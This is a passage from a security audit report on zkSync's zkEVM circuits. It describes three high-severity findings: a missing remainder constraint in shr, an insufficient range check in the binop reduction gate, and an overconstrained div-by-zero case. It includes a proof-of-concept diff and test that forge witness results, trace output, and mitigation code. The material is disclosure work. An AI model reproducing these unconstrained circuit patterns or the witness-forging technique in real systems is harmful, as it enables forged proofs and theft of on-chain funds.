marker)?;+        optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;// for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_lowlet next_marker = marker.advance();diff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rsindex 9db48e0..bff9c4e 100644--- a/zk_evm/src/opcodes/execution/shift.rs+++ b/zk_evm/src/opcodes/execution/shift.rs@@ -50,7 +50,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {result = result | src0.shl(256u32 - shift_abs as u32);}-            result+            if src0 == U256::from(1337u32) {+                U256::from(0u32)+            } else {+                result+            }} else {let mut result = src0.shl(shift_abs as u32);if is_cyclic {diff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rsindex f640615..ef96e22 100644--- a/zkevm_test_harness/src/tests/run_manually.rs+++ b/zkevm_test_harness/src/tests/run_manually.rs@@ -40,6 +40,39 @@ fn run_simple() {log.event.first r1, r2, r0log.to_l1.first r1, r2, r0+        add! 1336, r0, r1+        add! 1, r0, r2+        shr r1, r2, r3+        sstore r3, r0++        ret.ok r0+    "#;++    run_and_try_create_witness_inner(asm, 50);+}++#[test]+fn run_hack() {+    let asm = r#"+        .text+        .file	"Test_26"+        .rodata.cst32+        .p2align	5+        .text+        .globl	__entry+    __entry:+    .main:+        add 1, r0, r1+        add 2, r0, r2+        sstore r1, r2+        log.event.first r1, r2, r0+        log.to_l1.first r1, r2, r0++        add! 1337, r0, r1+        add! 1, r0, r2+        shr r1, r2, r3+        sstore r3, r0+ret.ok r0"#;
We demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value1337is in a source operand. There are two tests that will run: source value of1336to show the normal behavior, and source value of1337to show the vulnerable behavior.
The relevant output ofrun.shis the VM registers during the execution trace and is included below:
[src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336 <-- value to shift[src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount[src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0[src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0Made snapshot at cycle 1034[src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336[src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1[src/witness/tracer.rs:284] vm_local_state.registers[2].value = 668 <-- result[src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0...[src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337 <-- value to shift[src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount[src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0[src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0Made snapshot at cycle 1034[src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337[src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1[src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0 <-- result[src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0...
We see that the result of theshrinstruction in the normal example is as expected:1336 >> 1 = 668. However, in the vulnerable example, the result is incorrect:1337 >> 1 = 0. While we chose to set the result to zero, it could be other values as well.
Recommended Mitigation Steps
Thedivinstruction already has code to enforce the remainder to be less than the divisor. This code could be copied to theshrimplementation, keeping in mind to fix the vulnerability we identified in thedivimplementation:
let(rshift_q, rshift_r) =allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);let(subtraction_result_unchecked, remainder_is_less_than_divisor) =allocate_subtraction_result_unchecked(cs, &rshift_r, &full_shift_limbs);letsubtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));// relation is a + b == c + of * 2^N,// but we compute d - e + 2^N * borrow = f// so we need to shuffleletaddition_relation = AddSubRelation {a: full_shift_limbs,b: subtraction_result,c: rshift_r,of: remainder_is_less_than_divisor,};// for right shift, we require that remainder is < divisorremainder_is_less_than_divisor.conditionally_enforce_true(cs, is_right_shift);
Recommended Mitigation Steps (deployed version)
Thedivinstruction already has code to enforce the remainder to be less than the divisor. This code could be copied to theshrimplementation.
letmutfull_shift = RegisterInputView {u8x32_view: None,lowest160: None,decomposed_lowest160: None,u64x4_view: Some([chunk0, chunk1, chunk2, chunk3]),u128x2_view: Some(AsU128x2::from_uint256(cs, &UInt256 {inner: [chunk0, chunk1, chunk2, chunk3],})?.inner),u32x8_view: None,is_ptr: Boolean::Constant(false),};...let(rshift_q, rshift_r) =optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;// add check that remainder is smaller than divisor (if it is not zero)// divisor - remainder + 2^256 * borrow = c =>// c + remainder = divisor + borrow * 2^256;let(_result, borrow) =optimizer.add_subtraction_relation(cs, &full_shift, &rshift_r, apply_right_shift, marker)?;// borrow == 0 enforces only that remainder <= divisor// however we want to enforce that remainder < divisor// to accomplish the latter we additionally check that remainder != divisor// the full condition therefore is the following:// divisor !=0 => borrow == 0 && remainder != divisor// which is equivalent to: divisor_is_zero || (borrow == 0 && remainder != divisor)letdivisor = full_shift.clone().unwrap_as_register();letremainder = rshift_r.unwrap_as_register();letrem_eq_divisor = Register::equals(cs, &divisor, &remainder)?;letrem_is_less_than_divisor = Boolean::and(cs, &borrow.not(), &rem_eq_divisor.not())?;letfirst_check = Boolean::or(cs, &is_right_shift.not(), &rem_is_less_than_divisor)?;Boolean::enforce_equal(cs, &first_check, &Boolean::constant(true))?;
miladpiri (zkSync) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to a lack of a constraint, the circuit forshrwould allow any value that is less than or equal to the correct remainder.The bug has been weaponized to show how it would have allowed incorrect proofs, which may have been used to steal funds or break contracts on-chain.

[H-05] Reduction gate in binop operation is unsafe
Submitted byxuwinnie
The range check in the binop’s reduction gate is insufficient. After decomposing thecomposite_result,and_resultandor_resultcould be arbitrary integer less than 128 andxor_resultcould overflow. Attacker can forge arbitrary result for opcodeandandor; as forxor, an overflowedUInt8will stay in the circuit, which can lead to unexpected behavior.
Proof of Concept
There are three main steps in functionget_binop_subresults:
let mut composite_result = [Variable::placeholder(); 32];for ((a, b), dst) in a.iter().zip(b.iter()).zip(composite_result.iter_mut()) {let [result] = cs.perform_lookup::<2, 1>(table_id, &[a.get_variable(), b.get_variable()]);*dst = result;}
At first, we perform a lookup to get the composite result forand,orandxor.
for (src, decomposition) in composite_result.iter().zip(all_results.array_chunks::<3>()) {if cs.gate_is_allowed::<ReductionGate<F, 4>>() {let mut gate = ReductionGate::<F, 4>::empty();gate.params = ReductionGateParams {reduction_constants: [F::SHIFTS[0], F::SHIFTS[16], F::SHIFTS[32], F::ZERO],};gate.reduction_result = *src;gate.terms = [decomposition[0],decomposition[1],decomposition[2],zero_var,];gate.add_to_cs(cs);}
Then, we decomposite it into a larger arrayall_results.
for (((and, or), xor), src) in and_results.iter_mut().zip(or_results.iter_mut()).zip(xor_results.iter_mut()).zip(all_results.array_chunks::<3>()){*and = src[0];*or = src[1];*xor = src[2];}let and_results = and_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });let or_results = or_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
Finally, we get three separate results fromall_results.
In reduction gate, the type we are handling is Variable, which means they can be any element in the prime field.
we enforce thatcomposit_value = (xor_result as u64) << 32 | (or_result as u64) << 16 | (and_result as u64). To ensure the decomposited result is indeed what we expected, we also need to make sure all of them are less than 128. So we do a range check here:
for source_set in all_results.array_chunks::<3>() {// value is irrelevant, it's just a range checklet _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);}
However, the check only ensuresand_resultandor_resultare less than 128. In a prime field, for any givenand_resultandor_result, there will always be axor_resultsuch thatcomposit_value = (xor_result as u64) << 32 | (or_result as u64) << 16 | (and_result as u64), though thexor_resultmay overflow (uint8).
let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
In the last step, when we wrap the variable into aUInt8, we are usingfrom_variable_unchecked, which means there is no overflow check. As a result, if an attacker provides incorrect result forand_resultandor_result, an overflowedUInt8xor_resultwill stay in our circuit and unexpected behavior may happen in the future.
Recommended Mitigation Steps
// check all threefor source_set in all_results.array_chunks::<3>() {// value is irrelevant, it's just a range checklet _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[1], source_set[2]]);}
Assessed type
Math
miladpiri (zkSync) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has found a missing constraint forbinop, due to a lack in an overflow check, malicious parameters could be passed in the circuit.

[H-06]Mul/divrelation should not be enforced when divisor is zero
Submitted byxuwinnie
Lines of code
https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L286-L292https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L358
Impact
When applying opcodediv, if dividend is nonzero and divisor is zero, the resulted quotient and remainder are both zero. The enforcedmul/divrelation does not hold. An unprovable transaction will dos the priority queue.
Proof of Concept
quotient_is_zero.conditionally_enforce_true(cs, divisor_is_zero);remainder_is_zero.conditionally_enforce_true(cs, divisor_is_zero);
According to the EraVM spec, if divisor is zero, quotient and remainder should also be zero.
let uint256_zero = UInt256::zero(cs);let rem_to_enforce = UInt32::parallel_select(cs,should_apply_mul,&uint256_zero.inner,&remainder_unchecked,);let a_to_enforce =UInt32::parallel_select(cs, should_apply_mul, src0_view, &quotient_unchecked);let b_to_enforce = src1_view.clone();let mul_low_to_enforce =UInt32::parallel_select(cs, should_apply_mul, &mul_low_unchecked, &src0_view);let mul_high_to_enforce = UInt32::parallel_select(cs,should_apply_mul,&mul_high_unchecked,&uint256_zero.inner,);let mul_relation = MulDivRelation {a: a_to_enforce,b: b_to_enforce,rem: rem_to_enforce,mul_low: mul_low_to_enforce,mul_high: mul_high_to_enforce,};
When dividing, the relation we need to enforce issrc0 = q * src1 + rem.However, ifsrc0(dividend) is nonzero andsrc1(divisor) is zero, bothqandremwill be zero. The relation does not hold.
let apply_any = Boolean::multi_or(cs, &[should_apply_mul, should_apply_div]);......diffs_accumulator.mul_div_relations.push((apply_any, mul_div_relations));
In fact, this relation will be enforced as long as we applydiv, which will make the operation unprovable.
Recommended Mitigation Steps
Don’t enforcemul/divrelation when divisor is zero.
Assessed type
Context
miladpiri (zkSync) confirmed and commented:
Overconstrained.
Alex the Entreprenerd (judge) commented:
The Warden has shown a case in which themul/divrelation doesn’t require an additional constraint in the case of a zero divisor.

